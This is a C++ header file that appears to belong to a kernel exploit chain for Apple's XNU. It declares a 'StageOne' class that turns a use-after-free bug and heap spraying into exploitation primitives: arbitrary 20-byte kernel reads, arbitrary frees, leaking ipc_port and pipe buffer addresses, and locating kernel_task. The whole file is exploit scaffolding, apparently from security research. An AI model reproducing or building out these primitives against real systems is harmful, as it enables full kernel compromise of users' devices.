// <3 nedwill 2019
#ifndef STAGE_1_H_
#define STAGE_1_H_

#include <vector>

#include "dangling_options.h"
#include "spray.h"

// Given underlying UaF primitive and spray helpers,
// exposes arbitrary read of 20 bytes and arbitrary free.
class StageOne {
public:
  StageOne();
  ~StageOne();

  // Arbitrary free
  bool FreeAddress(void *address);

  template <typename T> bool Read(uint64_t addr, T *result);

  template <typename T>
  bool ReadMany(uint64_t addr, const std::vector<uint64_t> &offsets, T *result);

  // Gets ipc_port struct address from port
  bool GetPortAddr(mach_port_t port, uint64_t *port_kaddr);

  // TODO(nedwill): Passing fd_ofiles from the caller is a bit ugly but we
  // do this to avoid looking it up repeatedly. We could work around this
  // by caching known pointers globally.
  bool GetPipebufferAddr(uint64_t fd_ofiles, int fd,
                         uint64_t *pipebuffer_ptr_kaddr,
                         uint64_t *pipebuffer_kaddr);

  // TODO(nedwill): consider finding kernel_task using code pointers found
  // via fd_ofiles as this will take fewer reads and is deterministic.
  bool GetKernelTaskFromHostPort(uint64_t host_port, uint64_t *kernel_task);

private:
  // Reads 20 bytes from arbitrary address. This is the fundamental
  // read primitive.
  bool Read20(void *address, uint8_t *data);

  bool ReadFreeInternal(void *address, uint8_t *data, bool freeing);

  // Returns false if the given port is not the kernel_task port.
  bool GetKernelTaskFromPort(uint64_t port, uint64_t *kernel_task_address);

  Sprayer sprayer_;
};

#endif /* STAGE_1_H */
